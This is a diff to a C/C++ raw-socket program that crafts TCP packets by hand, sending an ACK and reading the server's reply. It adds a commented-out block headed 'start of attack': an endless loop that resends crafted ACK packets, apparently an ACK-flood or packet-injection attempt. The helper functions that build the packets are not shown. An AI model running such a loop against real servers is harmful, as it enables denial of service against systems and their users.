@@ -38,7 +38,7 @@ int receive_packet(int sockfd, char *buf, size_t len, struct sockaddr_in *dst)
             break;
         }
         memcpy(&dst_port, buf + 22, sizeof(dst_port));
-        cout << dst_port << endl;
+        // cout << dst_port << endl;
     } while (dst_port != dst->sin_port);
 
     /* Return the amount of recieved bytes */
@@ -155,17 +155,59 @@ int main()
     update_seq_and_ack(packetBuffer, &seqnum, &acknum);
 
     // ACK packet
-	memset(packetBuffer, 0, DATAGRAM_LEN);
-	gather_packet_data(dataBuffer, &sBufferLen, seqnum, acknum, NULL, 0);
-	create_raw_datagram(packetBuffer, &pBufferLen, ACK_PACKET, &src, &dest, dataBuffer, sBufferLen);
-	if ((sent = sendto(sockfd, packetBuffer, pBufferLen, 0, (struct sockaddr*)&dest, 
-					sizeof(struct sockaddr))) < 0) {
-		printf("failed.\n");
-		perror("ERROR:");
-		
-	}
-	free(dataBuffer);
+    memset(packetBuffer, 0, DATAGRAM_LEN);
+    gather_packet_data(dataBuffer, &sBufferLen, seqnum, acknum, NULL, 0);
+    create_raw_datagram(packetBuffer, &pBufferLen, ACK_PACKET, &src, &dest, dataBuffer, sBufferLen);
+    if ((sent = sendto(sockfd, packetBuffer, pBufferLen, 0, (struct sockaddr *)&dest,
+                       sizeof(struct sockaddr))) < 0)
+    {
+        printf("failed.\n");
+        perror("ERROR:");
+    }
 
+    pBufferLen = receive_packet(sockfd, packetBuffer, DATAGRAM_LEN, &src);
+    if (pBufferLen <= 0)
+    {
+        cout << "Failed" << endl;
+        cerr << "Error in receing packet from server" << endl;
+    }
 
+    // start of attack
+    // while (true)
+    // {
+
+    //     update_seq_and_ack(packetBuffer, &seqnum, &acknum);
+
+    //     memset(packetBuffer, 0, DATAGRAM_LEN);
+    //     gather_packet_data(dataBuffer, &sBufferLen, seqnum, acknum, NULL, 0);
+    //     create_raw_datagram(packetBuffer, &pBufferLen, ACK_PACKET, &src, &dest, dataBuffer, sBufferLen);
+    //     if ((sent = sendto(sockfd, packetBuffer, pBufferLen, 0, (struct sockaddr *)&dest,
+    //                        sizeof(struct sockaddr))) < 0)
+    //     {
+    //         printf("failed.\n");
+    //         perror("ERROR:");
+    //     }
+    // }
+
+    // pBufferLen = receive_packet(sockfd, packetBuffer, DATAGRAM_LEN, &src);
+    // if (pBufferLen <= 0)
+    // {
+    //     cout << "Failed" << endl;
+    //     cerr << "Error in receing packet from server" << endl;
+    // }
+
+    // update_seq_and_ack(packetBuffer, &seqnum, &acknum);
+
+    // memset(packetBuffer, 0, DATAGRAM_LEN);
+    // gather_packet_data(dataBuffer, &sBufferLen, seqnum, acknum, NULL, 0);
+    // create_raw_datagram(packetBuffer, &pBufferLen, ACK_PACKET, &src, &dest, dataBuffer, sBufferLen);
+    // if ((sent = sendto(sockfd, packetBuffer, pBufferLen, 0, (struct sockaddr*)&dest,
+    // 				sizeof(struct sockaddr))) < 0) {
+    // 	printf("failed.\n");
+    // 	perror("ERROR:");
+
+    // }
+
+    free(dataBuffer);
     return 0;
 }
